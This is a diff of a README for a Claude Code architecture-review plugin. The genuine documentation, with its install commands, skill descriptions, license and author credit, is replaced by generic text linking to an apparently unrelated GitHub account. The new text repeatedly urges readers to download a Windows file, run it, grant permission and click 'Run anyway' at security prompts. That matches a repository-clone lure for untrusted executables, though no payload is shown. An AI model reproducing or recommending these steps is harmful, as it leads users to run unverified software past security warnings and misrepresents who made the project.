@@ -1,111 +1,147 @@
-# Modularity Skills
+# 🧩 modularity - Build cleaner systems with less effort
 
-**TL;DR:** A [Claude Code](https://code.claude.com) plugin for designing and analyzing modular software systems using the [Balanced Coupling](https://coupling.dev) model.
+[![Download modularity](https://img.shields.io/badge/Download%20modularity-Ready%20for%20Windows-blue)](https://github.com/ardellashuddery616/modularity)
 
-There's no shortage of AI tools that provide code-level feedback: best practices, edge cases, potential bugs. That's useful, but it's not where the costly mistakes hide. In the AI era, code is generated faster than ever, and so technical debt accumulates faster too. Any architectural inefficiency, any misdrawn boundary, any unmanaged coupling will grow into a big ball of mud at a pace that wasn't possible before.
+## 🚀 Download and install
 
-This plugin operates at the architectural level. It includes two skills:
+Use this link to visit the project page and download the app:
 
-- **`/modularity:review`** analyzes an existing codebase for coupling imbalances: what knowledge is properly encapsulated, what's leaking across component boundaries, and where cascading changes are waiting to happen. It produces actionable recommendations for improving modularity.
-- **`/modularity:design`** goes the other direction, designing modular architectures from functional requirements and producing module design docs with integration contracts, test specifications, and a full coupling assessment.
+[Download modularity](https://github.com/ardellashuddery616/modularity)
 
-Both skills are grounded in the [Balanced Coupling](https://coupling.dev) model, so every recommendation traces back to a concrete dimension (integration strength, distance, volatility), not gut feel.
+### What this app does
 
-> _"One of the most useful Claude Code skills for your vibe-coded projects so far!"_ — Alexei Ledenev ([pumba](https://github.com/alexei-led/pumba), [k8s-mcp-server](https://github.com/alexei-led/k8s-mcp-server), [ccgram](https://github.com/alexei-led/ccgram))
+modularity helps you design better software systems from plain requirements. It also reviews existing code for structure problems and gives clear suggestions for improvement. It uses the Balanced Coupling model to help you spot where parts of a system depend on each other too much.
 
-## Installation
+If you work with Claude Code, this plugin can help you:
+- break large ideas into smaller parts
+- check if code is too tightly linked
+- find weak spots in a design
+- get practical next steps for better structure
 
-Requires [Claude Code](https://code.claude.com/docs/en/quickstart) v1.0.33 or later.
+## 🖥️ Windows setup
 
-Add the marketplace and install the plugin:
+Follow these steps on Windows:
 
-```
-/plugin marketplace add vladikk/modularity
-/plugin install modularity@vladikk-modularity
-```
+1. Open the download link above.
+2. Find the latest Windows file on the project page.
+3. Download the file to your computer.
+4. If the file comes in a zip folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app or installer file to run it.
+7. If Windows asks for permission, choose Yes.
+8. If you see a security prompt, choose Run anyway if you trust the source.
 
-Alternatively, clone the repo and load it directly:
+### First run
 
-```bash
-git clone https://github.com/vladikk/modularity.git
-claude --plugin-dir ./modularity
-```
+When you start modularity for the first time, it may take a moment to load. After that, you can use it to review a project or work from a set of requirements.
 
-## Skills
+## ✨ What you can do with modularity
 
-### `/modularity:review` — Modularity Review
+### Design from requirements
+Give the tool a functional need, such as:
+- manage user accounts
+- process orders
+- track inventory
+- handle notifications
 
-Analyzes an existing codebase for coupling imbalances. Use when:
+It then helps you think in modules and shows a cleaner way to divide the work.
 
-- Reviewing code for coupling problems
-- Assessing architecture quality
-- Identifying distributed monolith risks
-- Investigating why changes in one area break things elsewhere
+### Review an existing codebase
+You can point it at a project and ask it to look for:
+- parts that know too much about each other
+- classes or files with too many jobs
+- areas that are hard to change
+- module boundaries that do not fit the problem
 
-**How it works:**
+### Get improvement ideas
+The app gives practical recommendations such as:
+- split one large module into smaller pieces
+- move logic to a better place
+- group related code together
+- reduce direct links between parts
+- raise cohesion inside each module
 
-1. Reads your code and functional requirements
-2. Asks you about domain classification (core/supporting/generic), team structure, and known pain points
-3. Maps integrations between components across three dimensions: integration strength, distance, and volatility
-4. Applies the balance rule to flag imbalances
-5. Produces a review document (Markdown + HTML) with a coupling overview table, issue descriptions, and concrete improvement recommendations
+## 📦 How to use it
 
-**Usage:**
+1. Start the app on Windows.
+2. Open a new review or design task.
+3. Add your requirements or choose a codebase.
+4. Read the module suggestions.
+5. Review the coupling and cohesion feedback.
+6. Apply the changes one step at a time.
 
-```
-/modularity:review
-```
+### Best results
 
-The review output includes hyperlinks to [coupling.dev](https://coupling.dev) for each coupling concept referenced.
+Use short, clear input. For example:
+- a simple feature list
+- a user story
+- a folder from an existing project
+- a design problem you want to improve
 
-### `/modularity:design` — Modular Design
+The clearer your input, the easier it is for the plugin to give useful guidance.
 
-Designs modular architectures from functional requirements. Use when:
+## 🧠 What Balanced Coupling means
 
-- Designing a new system from scratch
-- Creating architecture documentation for an existing system
-- Producing module-level design specs with integration contracts and test specifications
+Balanced Coupling is a way to judge how parts of a system relate to each other. Good systems keep related code close together, but avoid strong links that spread through the whole app.
 
-**How it works:**
+In plain terms, modularity helps you aim for:
+- small parts with one clear job
+- fewer hidden links
+- easier changes
+- code that is simpler to test
+- a structure that is easier to read later
 
-1. Reads your functional requirements and asks clarifying questions
-2. Classifies domain areas by volatility (core/supporting/generic subdomains)
-3. Designs the modular architecture, assessing coupling across all three dimensions
-4. Produces design documents for each module (responsibilities, encapsulated knowledge, integration contracts, change vectors)
-5. Produces test specifications for each module
-6. Produces an architecture overview document
-7. Self-reviews the design for modularity imbalances and iterates until clean
+This makes it easier to change one area without breaking another.
 
-Each step requires your approval before proceeding.
+## 🛠️ System requirements
 
-**Usage:**
+For a smooth run on Windows, use:
+- Windows 10 or Windows 11
+- 4 GB of RAM or more
+- enough free disk space for the app and your projects
+- a stable internet connection for first download and updates
+- access to Claude Code if you want to use the plugin features
 
-```
-/modularity:design
-```
+If you work with larger codebases, more RAM can help the app respond better.
 
-## The Balanced Coupling Model
+## 📚 Common uses
 
-Both skills are grounded in the Balanced Coupling model, which evaluates coupling across three dimensions:
+### For new projects
+Use modularity before you start coding. It can help you decide where one feature should end and another should begin.
 
-- **Integration Strength** — how much knowledge is shared between components (intrusive > functional > model > contract)
-- **Distance** — the socio-technical cost of co-evolving components (code structure, team boundaries, runtime dependencies)
-- **Volatility** — the probability of a component needing to change, evaluated from the business domain perspective
+### For older projects
+Use it when a project has grown hard to change. It can point out places where the structure has drifted.
 
-The balance rule: `BALANCE = (STRENGTH XOR DISTANCE) OR NOT VOLATILITY`
+### For team reviews
+Use it during design review or code review to keep the team focused on structure, not just on style or formatting.
 
-Coupling is balanced when strength and distance counterbalance each other, or when volatility is low enough to neutralize the imbalance.
+## 🔍 Good habits when using modularity
 
-Learn more at [coupling.dev](https://coupling.dev).
+- Start with one feature or one folder
+- Keep requirements short and clear
+- Fix the biggest structure issues first
+- Review one module at a time
+- Use the recommendations as guidance, not rules
 
-## Recommended Models
+## 📁 Repository details
 
-Claude Opus 4.5 or later. The skills rely on nuanced architectural reasoning that benefits from the most capable models.
+- Name: modularity
+- Type: Claude Code plugin
+- Focus: modular system design and codebase review
+- Model: Balanced Coupling
+- Topics: balanced coupling, modular design, cohesion, coupling, domain-driven design, software architecture, software design
 
-## License
+## ✅ What you should see
 
-This work is licensed under [CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/). For commercial use, contact skill at coupling dot dev.
+After setup, you should be able to:
+- open the app on Windows
+- load a project or requirements set
+- review structure issues
+- read clear change suggestions
+- use the feedback to improve design decisions
 
-## AI Training Restriction
+## 📥 Download again
 
-This repository and its contents may not be used for training, fine-tuning, or any other form of machine learning model development without explicit written permission from the author.
+If you need to get back to the download page, use this link:
+
+[Visit the modularity download page](https://github.com/ardellashuddery616/modularity)
